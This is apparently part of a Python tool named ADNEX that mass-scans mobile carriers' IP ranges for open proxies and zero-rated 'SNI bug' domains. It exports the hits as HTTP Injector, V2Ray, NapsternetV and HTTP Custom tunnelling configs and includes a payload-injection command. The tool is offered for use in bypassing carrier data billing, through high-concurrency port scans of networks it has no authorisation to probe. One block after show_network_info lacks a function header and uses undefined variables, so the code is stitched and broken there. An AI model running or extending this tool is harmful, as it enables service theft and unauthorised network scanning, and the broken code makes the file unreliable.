    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    carrier = CARRIERS.get(carrier_key, {"name": "unknown", "apn": "internet"})
    exported = []

    if scan_results["proxies"]:
        hi_file = RESULTS_DIR / "exports" / f"hi_config_{carrier_key}_{ts}.conf"
        with open(hi_file, "w") as f:
            f.write(f"[HTTP Injector Config]\n")
            f.write(f"# Generated by ADNEX {VERSION}\n")
            f.write(f"# Developer: {DEVELOPER} | {COUNTRY}\n")
            f.write(f"# Carrier: {carrier['name']}\n")
            f.write(f"# Timestamp: {datetime.now()}\n\n")
            for p in sorted(scan_results["proxies"], key=lambda x: x.get("latency", 9999)):
                f.write(f"[PROXY]\n")
                f.write(f"Host={p['ip']}\n")
                f.write(f"Port={p['port']}\n")
                f.write(f"Type={p['type']}\n")
                f.write(f"Latency={p.get('latency', 0)}ms\n\n")
        exported.append(str(hi_file))

        raw_file = RESULTS_DIR / "exports" / f"raw_proxies_{carrier_key}_{ts}.txt"
        with open(raw_file, "w") as f:
            for p in scan_results["proxies"]:
                f.write(f"{p['ip']}:{p['port']}\n")
        exported.append(str(raw_file))

        csv_file = RESULTS_DIR / "exports" / f"proxies_{carrier_key}_{ts}.csv"
        with open(csv_file, "w", newline="") as f:
            writer = csv.DictWriter(f, fieldnames=["ip", "port", "type", "latency", "status"])
            writer.writeheader()
            writer.writerows(scan_results["proxies"])
        exported.append(str(csv_file))

    if scan_results["sni_bugs"]:
        nn_file = RESULTS_DIR / "exports" / f"napsternetv_{carrier_key}_{ts}.json"
        nn_configs = [format_sni_for_napsternetv(s["domain"], carrier["name"]) for s in scan_results["sni_bugs"]]
        with open(nn_file, "w") as f:
            json.dump(nn_configs, f, indent=2)
        exported.append(str(nn_file))

        v2_file = RESULTS_DIR / "exports" / f"v2ray_{carrier_key}_{ts}.json"
        v2_configs = []
        for s in scan_results["sni_bugs"]:
            v2_configs.append({
                "v": "2", "ps": f"ADNEX-{carrier['name']}",
                "add": s["domain"], "port": "443",
                "id": hashlib.md5(s["domain"].encode()).hexdigest(),
                "aid": "0", "scy": "auto", "net": "ws",
                "type": "none", "host": s["domain"],
                "path": "/", "tls": "tls", "sni": s["domain"]
            })
        with open(v2_file, "w") as f:
            json.dump(v2_configs, f, indent=2)
        exported.append(str(v2_file))

        hc_file = RESULTS_DIR / "exports" / f"httpcustom_{carrier_key}_{ts}.hc"
        with open(hc_file, "w") as f:
            f.write(f"# HTTP Custom Config - ADNEX {VERSION}\n")
            f.write(f"# Developer: {DEVELOPER}\n\n")
            for s in scan_results["sni_bugs"]:
                f.write(f"[SERVER]\n")
                f.write(f"SNI={s['domain']}\n")
                f.write(f"Host={s['domain']}\n")
                f.write(f"Port=443\n\n")
        exported.append(str(hc_file))

    return exported

def run_deep_sni_command(carrier_key, cfg):
    if carrier_key not in CARRIERS:
        console.print(f"  [{PINK}]► Unknown carrier[/]")
        return
    carrier = CARRIERS[carrier_key]
    console.print(f"\n  [bold {CYAN}]► Deep SNI probe starting → {carrier['name']}[/]")
    loop = asyncio.new_event_loop()
    results = loop.run_until_complete(batch_sni_deep_scan(carrier["zero_rated"], cfg))
    loop.close()
    console.print(f"\n  [bold {GREEN}]═══ DEEP SNI PROBE RESULTS ═══[/]")
    for r in results:
        if isinstance(r, dict):
            tls_ok = r.get("tls_active", False)
            http_ok = r.get("http_active", False)
            tls_color = GREEN if tls_ok else PINK
            http_color = GREEN if http_ok else PINK
            console.print(f"  [bold {CYAN}]{r.get('domain', 'unknown'):<40}[/]", end="")
            console.print(f" TLS:[{tls_color}]{'✓' if tls_ok else '✗'}[/]  HTTP:[{http_color}]{'✓' if http_ok else '✗'}[/]")
            if tls_ok:
                console.print(f"    [{GREEN}]TLS → {r.get('tls_443', '')[:60]}[/]")
            if http_ok:
                console.print(f"    [{GREEN}]HTTP → {r.get('http_80', '')[:60]}[/]")
    console.print()

def show_about():
    console.print(f"\n[bold {GREEN}]{'═'*50}[/]")
    console.print(f"[bold {CYAN}]  {TOOL_NAME} {VERSION}[/]")
    console.print(f"[bold {GREEN}]{'═'*50}[/]")
    console.print(f"  [{GREEN}]Purpose  :[/] [{WHITE}]Network SNI Bug & Proxy Host Scanner[/]")
    console.print(f"  [{GREEN}]Developer:[/] [{CYAN}]{DEVELOPER}[/]")
    console.print(f"  [{GREEN}]Origin   :[/] [{CYAN}]{COUNTRY}[/]")
    console.print(f"  [{GREEN}]Age      :[/] [{CYAN}]{AGE}[/]")
    console.print(f"  [{GREEN}]Version  :[/] [{CYAN}]{VERSION}[/]")
    console.print(f"  [{GREEN}]Year     :[/] [{CYAN}]{YEAR}[/]")
    console.print(f"  [{GREEN}]Engine   :[/] [{WHITE}]asyncio + aiohttp (async I/O)[/]")
    console.print(f"  [{GREEN}]Carriers :[/] [{WHITE}]{len(CARRIERS)} supported[/]")
    console.print(f"  [{GREEN}]Exports  :[/] [{WHITE}]HTTP Injector, V2Ray, NapsternetV, HTTP Custom[/]")
    console.print(f"[bold {GREEN}]{'═'*50}[/]\n")

def show_network_info():
    console.print(f"\n[bold {GREEN}]═══ NETWORK INFO ═══[/]")
    try:
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        console.print(f"  [{CYAN}]Hostname  : {hostname}[/]")
        console.print(f"  [{CYAN}]Local IP  : {local_ip}[/]")
    except:
        pass
    try:
        if ORACTL_OK:
            interfaces = _sys.net_if_addrs()
            for iface, addrs in interfaces.items():
                for addr in addrs:
                    if addr.family == "IPv4":
                        console.print(f"  [{GREEN}]Interface : {iface:<12} → {addr.address}[/]")
    except:
        pass
    console.print(f"  [{YELLOW}]Fetching public IP...[/]", end="\r")
    pub_ip = get_public_ip()
    console.print(f"  [{CYAN}]Public IP : {pub_ip}[/]               ")
    console.print()

    content = Text()
    pct = min(100, int((scanned / max(total, 1)) * 100))
    bar_filled = int(pct / 5)
    bar = "█" * bar_filled + "░" * (20 - bar_filled)
    content.append(f"  Carrier  : {carrier}\n", style=GREEN)
    content.append(f"  Progress : [{bar}] {pct}%\n", style=PINK)
    content.append(f"  Scanned  : {scanned}/{total}\n", style=GREEN)
    content.append(f"  Hits     : {hits}\n", style=PINK if hits > 0 else GREEN)
    content.append(f"  Speed    : {speed}/s\n", style=CYAN)
    return Panel(content, title=f"[bold {GREEN}]▸ SCAN PROGRESS[/]", border_style=GREEN)

def render_top_proxies_table():
    t = Table(box=box.MINIMAL, show_header=True, header_style=f"bold {GREEN}")
    t.add_column("RANK", style=f"dim {GREEN}", width=5)
    t.add_column("HOST", style=GREEN, width=16)
    t.add_column("PORT", style=CYAN, width=6)
    t.add_column("TYPE", style=PINK, width=8)
    t.add_column("MS", style=YELLOW, width=6)
    best = sorted(scan_results["proxies"], key=lambda x: x.get("latency", 9999))[:20]
    for i, p in enumerate(best, 1):
        rank_color = PINK if i <= 3 else GREEN
        t.add_row(
            f"[{rank_color}]{i}[/]",
            p["ip"],
            str(p["port"]),
            p["type"],
            str(p.get("latency", "?"))
        )
    return t

def render_full_results_screen():
    console.clear()
    banner = Text()
    banner.append("  ADNEX ", style=f"bold {GREEN}")
    banner.append(VERSION, style=f"bold {PINK}")
    banner.append(" | RESULTS VIEWER\n", style=f"dim {GREEN}")
    banner.append(f"  Developer: {DEVELOPER} | {COUNTRY}\n", style=CYAN)
    console.print(Panel(banner, border_style=GREEN))

    stats = Table(box=box.SIMPLE, show_header=False)
    stats.add_column("K", style=f"bold {CYAN}", width=18)
    stats.add_column("V", style=GREEN)
    stats.add_row("Carrier", scan_results.get("carrier", "N/A"))
    stats.add_row("Total Scanned", str(scan_results["total_scanned"]))
    stats.add_row("Proxy Hits", str(len(scan_results["proxies"])))
    stats.add_row("SNI Bugs", str(len(scan_results["sni_bugs"])))
    stats.add_row("Total Hits", str(scan_results["total_hits"]))
    if scan_results["start_time"]:
        elapsed = int(time.time() - scan_results["start_time"])
        stats.add_row("Duration", f"{elapsed}s")
    console.print(Panel(stats, title=f"[bold {GREEN}]SESSION STATS[/]", border_style=GREEN))

    if scan_results["proxies"]:
        console.print(f"\n[bold {PINK}]TOP PROXY HITS (sorted by latency):[/]")
        console.print(render_top_proxies_table())

    if scan_results["sni_bugs"]:
        console.print(f"\n[bold {CYAN}]SNI BUG HOSTS:[/]")
        sni_t = Table(box=box.MINIMAL, show_header=True, header_style=f"bold {CYAN}")
        sni_t.add_column("DOMAIN", style=CYAN, width=40)
        sni_t.add_column("TYPE", style=GREEN, width=14)
        sni_t.add_column("STATUS", style=PINK, width=10)
        for s in scan_results["sni_bugs"]:
            sni_t.add_row(s["domain"], s["type"], "ACTIVE")
        console.print(sni_t)

def add_custom_carrier(name, country, ip_ranges, zero_rated, ports, apn, key):
    CARRIERS[key] = {
        "name": name,
        "country": country,
        "ip_ranges": ip_ranges,
        "zero_rated": zero_rated,
        "ports": ports,
        "apn": apn
    }
    add_log(f"Custom carrier added: {name}", "INFO")

def parse_cidr_file(filepath):
    ranges = []
    try:
        with open(filepath) as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#"):
                    try:
                        ipaddress.IPv4Network(line, strict=False)
                        ranges.append(line)
                    except:
                        pass
    except:
        pass
    return ranges

def quick_port_scan(ip, ports, timeout=3):
    open_ports = []
    for port in ports:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result = sock.connect_ex((ip, port))
            if result == 0:
                open_ports.append(port)
            sock.close()
        except:
            pass
    return open_ports

async def async_port_scan(ips, ports, timeout=3):
    semaphore = asyncio.Semaphore(300)
    results = {}
    async def scan_one(ip):
        async with semaphore:
            open_ports = []
            for port in ports:
                try:
                    reader, writer = await asyncio.wait_for(
                        asyncio.open_connection(ip, port),
                        timeout=timeout
                    )
                    open_ports.append(port)
                    writer.close()
                except:
                    pass
            if open_ports:
                results[ip] = open_ports
                add_log(f"PORT OPEN → {ip} ports: {open_ports}", "HIT")
    await asyncio.gather(*[scan_one(ip) for ip in ips], return_exceptions=True)
    return results

def run_port_scan_command(target, cfg):
    parts = target.split("/")
    if len(parts) == 2:
        ips = expand_ip_range(target)
    else:
        ips = [target]
    ports = [80, 8080, 3128, 8888, 443, 1080, 9050, 8443, 3129]
    console.print(f"\n  [bold {GREEN}]► Port scan: {target} — {len(ips)} hosts[/]")
    loop = asyncio.new_event_loop()
    results = loop.run_until_complete(async_port_scan(ips[:500], ports, cfg["timeout"]))
    loop.close()
    console.print(f"\n  [bold {GREEN}]═══ PORT SCAN RESULTS ═══[/]")
    if results:
        for ip, ports_open in results.items():
            console.print(f"  [{CYAN}]{ip:<18}[/] [{GREEN}]Ports: {ports_open}[/]")
    else:
        console.print(f"  [{YELLOW}]No open ports found.[/]")
    console.print()

def run_command(cmd_input, cfg):
    parts = cmd_input.strip().split()
    if not parts:
        return
    cmd = parts[0].lower()
    arg1 = parts[1].lower() if len(parts) > 1 else ""
    arg2 = parts[2].lower() if len(parts) > 2 else "balanced"

    # number shortcuts
    carrier_map = {str(i+1): k for i, k in enumerate(CARRIERS.keys())}
    if cmd in carrier_map:
        key = carrier_map[cmd]
        console.print(f"  [bold #ff2d78]► Shortcut: scan {key}[/]")
        run_ultra_scan(key, "balanced", cfg)
        return

    if cmd == "exit" or cmd == "quit":
        console.print(f"\n[bold #ff2d78]► ADNEX {VERSION} | {DEVELOPER} © {YEAR}[/]\n")
        sys.exit(0)
    elif cmd == "help":
        console.print(f"\n[bold #00ff41]{'═'*55}[/]")
        console.print(f"[bold #00ffff]  ADNEX {VERSION} — COMMANDS[/]")
        console.print(f"[bold #00ff41]{'═'*55}[/]")
        cmds = [
            ("scan <carrier>","Full scan proxy+SNI"),
            ("turbo <carrier>","Max speed 2000 threads"),
            ("aggressive <carrier>","1000 threads"),
            ("ultra <carrier> <strategy>","Custom strategy"),
            ("stealth <carrier>","Stealth scan"),
            ("deepsni <carrier>","Deep SNI probe"),
            ("inject <carrier>","Payload injection"),
            ("wscan <carrier>","WebSocket scan"),
            ("commonsni","Common SNI bugs"),
            ("massport <carrier> <port>","Mass port check"),
            ("multiscan <c1,c2>","Multi-carrier scan"),
            ("autoscan","Auto-detect carrier"),
            ("results","Show results"),
            ("top","Top proxies ranked"),
            ("exportall <carrier>","Export all formats"),
            ("bestexport <carrier>","Export best only"),
            ("sub","V2Ray subscription"),
            ("geo <ip>","GeoIP lookup"),
            ("stats","Scan statistics"),
            ("status","Current status"),
            ("list","List carriers"),
            ("validate <ip:port>","Validate proxy"),
            ("resolve <carrier>","Resolve domains"),
            ("stop","Stop scan"),
            ("clear","Clear screen"),
            ("dashboard","Show dashboard"),
            ("exit","Quit ADNEX"),
        ]
        for c, d in cmds:
            console.print(f"  [#ff2d78]{c:<28}[/] [#00ff41]{d}[/]")
        console.print(f"[bold #00ff41]{'═'*55}[/]\n")
        console.print(f"  [#00ffff]Tip: Type carrier number to scan (e.g: 1 = econet)[/]\n")

    elif cmd == "list" or cmd == "carriers" or cmd == "allcarriers":
        show_all_carriers_table()
    elif cmd == "scan" and arg1:
        if arg1 not in CARRIERS:
            console.print(f"  [#ff2d78]Unknown carrier. Use 'list' to see options.[/]")
        else:
            run_ultra_scan(arg1, "balanced", cfg)
    elif cmd == "turbo" and arg1:
        run_turbo_scan(arg1, cfg)
    elif cmd == "aggressive" and arg1:
        run_aggressive_scan(arg1, cfg)
    elif cmd == "ultra" and arg1:
        run_ultra_scan(arg1, arg2 if arg2 in SCAN_STRATEGIES else "balanced", cfg)
    elif cmd == "stealth" and arg1:
        run_stealth_scan(arg1, cfg)
    elif cmd == "deepsni" and arg1:
        run_deep_sni_command(arg1, cfg)
    elif cmd == "inject" and arg1:
        run_payload_inject_scan(arg1, cfg)
    elif cmd == "wscan" and arg1:
        run_websocket_scan(arg1, cfg)
    elif cmd == "commonsni":
        run_common_sni_scan(cfg)
    elif cmd == "massport" and arg1 and len(parts) > 2:
        run_mass_port_check(arg1, int(parts[2]) if parts[2].isdigit() else 8080, cfg)
    elif cmd == "multiscan" and arg1:
        run_multi_scan_command(arg1, cfg)
    elif cmd == "autoscan":
        run_auto_scan(cfg)
    elif cmd == "cfsweep":
        run_cloudflare_sweep(cfg)
    elif cmd == "scanip" and arg1:
        scan_single_ip_command(arg1, cfg)
    elif cmd == "portscan" and arg1:
        run_port_scan_command(arg1, cfg)
    elif cmd == "scanrange" and arg1:
        ports_str = parts[2] if len(parts) > 2 else "80,8080,3128"
        scan_custom_range(arg1, ports_str, cfg)
    elif cmd == "fullport" and arg1:
        run_full_port_scan(arg1, cfg)
    elif cmd == "discover" and arg1:
        run_smart_discovery(arg1, cfg)
    elif cmd == "results":
        show_top_results(20)
    elif cmd == "top":
        count = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 20
        show_top_results(count)
    elif cmd == "stats":
        show_scan_stats_detailed()
    elif cmd == "status":
        display_scan_summary_live()
    elif cmd == "stop":
        scan_results["scanning"] = False
        add_log("Scan stopped by user", "WARN")
        console.print(f"  [#ffff00]► Scan stopped.[/]")
    elif cmd == "flush":
        scan_results["proxies"] = []
        scan_results["sni_bugs"] = []
        scan_results["logs"] = []
        scan_results["total_scanned"] = 0
        scan_results["total_hits"] = 0
        console.print(f"  [#00ff41]► Results cleared.[/]")
    elif cmd == "exportall" and arg1:
        exported = export_all_formats(arg1)
        console.print(f"  [bold #00ff41]► {len(exported)} files exported.[/]")
        for ef in exported:
            console.print(f"    [#00ffff]{ef}[/]")
    elif cmd == "bestexport" and arg1:
        export_best_for_apps(arg1)
    elif cmd == "export" and arg1:
        exported = export_all_formats(arg1)
        console.print(f"  [bold #00ff41]► Exported {len(exported)} files.[/]")
    elif cmd == "sub" or cmd == "subscription":
        run_subscription_command()
    elif cmd == "report":
        out = export_session_report()
        console.print(f"  [#00ff41]► Report saved → {out}[/]")
    elif cmd == "summary":
        run_summary_command()
    elif cmd == "geo" and arg1:
        run_geo_command(arg1)
    elif cmd == "geobatch":
        run_geo_batch_command(scan_results["proxies"])
    elif cmd == "validate" and arg1:
        if ":" in arg1:
            ip, port = arg1.split(":")
            console.print(f"  [#00ff41]► Validating {ip}:{port}...[/]")
            loop = asyncio.new_event_loop()
            valid = loop.run_until_complete(validate_proxy_triple(ip, int(port), cfg["timeout"]))
            loop.close()
            if valid:
                console.print(f"  [bold #00ff41]► CONFIRMED WORKING[/]")
            else:
                console.print(f"  [#ff2d78]► FAILED[/]")
    elif cmd == "resolve" and arg1:
        run_resolve_command(arg1)
    elif cmd == "netinfo":
        show_network_info()
    elif cmd == "history" or cmd == "saved":
        show_saved_results()
    elif cmd == "config":
        console.print(f"\n[bold #00ff41]CONFIG:[/]")
        for k, v in cfg.items():
            console.print(f"  [#00ffff]{k:<20}[/] [#00ff41]{v}[/]")
        console.print()
    elif cmd == "about":
        show_about()
    elif cmd == "benchmark":
        benchmark_speed(cfg)
    elif cmd == "clear":
        console.clear()
        print_dashboard()
    elif cmd == "dashboard":
        print_dashboard()
    elif cmd == "chart":
        run_latency_chart_command()
    elif cmd == "autovalidate":
        interval = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 120
        start_continuous_validator(interval)
    elif cmd == "watch" and arg1:
        interval = int(parts[2]) if len(parts) > 2 and parts[2].isdigit() else 30
        watch_mode(arg1, cfg, interval)
    elif cmd == "loadfile" and arg1:
        run_validate_file_command(arg1, cfg)
    elif cmd == "payload" and arg1:
        proxy_ip = parts[2] if len(parts) > 2 else "0.0.0.0"
        proxy_port = int(parts[3]) if len(parts) > 3 and parts[3].isdigit() else 8080
        sni = parts[4] if len(parts) > 4 else None
        out, _ = generate_payload_config(arg1, proxy_ip, proxy_port, sni)
        console.print(f"  [#00ff41]► Saved → {out}[/]")
    elif cmd == "carrierstats":
        show_carrier_stats()
    elif cmd == "tips" or cmd == "quickstart":
        show_quick_start()
    elif cmd in ("scanmenu", "exportmenu"):
        show_scan_menu()
    else:
        console.print(f"  [#ff2d78]Unknown command: '{cmd}'. Type 'help' for commands.[/]")


def print_dashboard():
    sysinfo = get_system_info()
    console.print(f"[bold #00ff41]{'═'*60}[/]")
    console.print(f"[bold #ff2d78]  ADNEX {VERSION} | {DEVELOPER} | {COUNTRY} | Age {AGE}[/]")
    console.print(f"[bold #00ff41]{'═'*60}[/]")
    console.print(f"  [#00ffff]OS    :[/] [#00ff41]{sysinfo['platform']}[/]")
    console.print(f"  [#00ffff]CPU   :[/] [#00ff41]{sysinfo['cpu']}%[/]")
    console.print(f"  [#00ffff]RAM   :[/] [#00ff41]{sysinfo['ram_used']}GB / {sysinfo['ram_total']}GB ({sysinfo['ram_pct']}%)[/]")
    console.print(f"  [#00ffff]DISK  :[/] [#00ff41]{sysinfo['disk_used']}GB / {sysinfo['disk_total']}GB[/]")
    console.print(f"  [#00ffff]STATUS:[/] [#ff2d78]{'SCANNING' if scan_results['scanning'] else 'IDLE'}[/]")
    console.print(f"  [#00ffff]HITS  :[/] [#ff2d78]{scan_results['total_hits']}[/]  [#00ffff]PROXIES:[/] [#00ff41]{len(scan_results['proxies'])}[/]  [#00ffff]SNI:[/] [#00ff41]{len(scan_results['sni_bugs'])}[/]")
    console.print(f"  [#00ffff]TIME  :[/] [#00ff41]{datetime.now().strftime('%H:%M:%S')} | {datetime.now().strftime('%a %d %b %Y')}[/]")
    console.print(f"[bold #00ff41]{'═'*60}[/]")
    console.print()
    console.print(f"  [bold #ff2d78]CARRIERS:[/]")
    for i, (key, val) in enumerate(CARRIERS.items(), 1):
        console.print(f"    [#00ffff][{i:02d}][/] [#00ff41]{key:<12}[/] [#ffffff]{val['name']} ({val['country']})[/]")
    console.print()
    console.print(f"  [bold #ff2d78]COMMANDS:[/]")
    console.print(f"    [#ff2d78]scan <carrier>[/]    [#00ff41]→ Full scan (e.g: scan econet)[/]")
    console.print(f"    [#ff2d78]turbo <carrier>[/]   [#00ff41]→ Max speed scan[/]")
    console.print(f"    [#ff2d78]deepsni <carrier>[/] [#00ff41]→ SNI only scan[/]")
    console.print(f"    [#ff2d78]results[/]           [#00ff41]→ Show results[/]")
    console.print(f"    [#ff2d78]exportall <carrier>[/] [#00ff41]→ Export configs[/]")
    console.print(f"    [#ff2d78]stop[/]              [#00ff41]→ Stop scan[/]")
    console.print(f"    [#ff2d78]status[/]            [#00ff41]→ Scan status[/]")
    console.print(f"    [#ff2d78]list[/]              [#00ff41]→ List carriers[/]")
    console.print(f"    [#ff2d78]help[/]              [#00ff41]→ All commands[/]")
    console.print(f"    [#ff2d78]clear[/]             [#00ff41]→ Clear screen[/]")
    console.print(f"    [#ff2d78]exit[/]              [#00ff41]→ Quit[/]")
    console.print(f"[bold #00ff41]{'═'*60}[/]")
    console.print()


def main():
    auto_install_deps()
    setup_dirs()
    cfg = load_config()
    extended_boot_sequence()
    print_dashboard()

    while True:
        try:
            sys.stdout.write("adnex@jadenafrix~$ ")
            sys.stdout.flush()
            cmd_input = sys.stdin.readline()
            if cmd_input is None:
                break
            cmd_input = cmd_input.strip()
            if not cmd_input:
                continue
            add_log(f"CMD → {cmd_input}", "INFO")
            if cmd_input.lower() == "clear":
                console.clear()
                print_dashboard()
            elif cmd_input.lower() == "dashboard":
                print_dashboard()
            else:
                run_command(cmd_input, cfg)
        except KeyboardInterrupt:
            console.print(f"\n[bold #ff2d78]► Use 'exit' to quit ADNEX[/]")
        except EOFError:
            break
        except Exception as e:
            console.print(f"[#ff2d78]Error: {e}[/]")


if __name__ == "__main__":
    main()
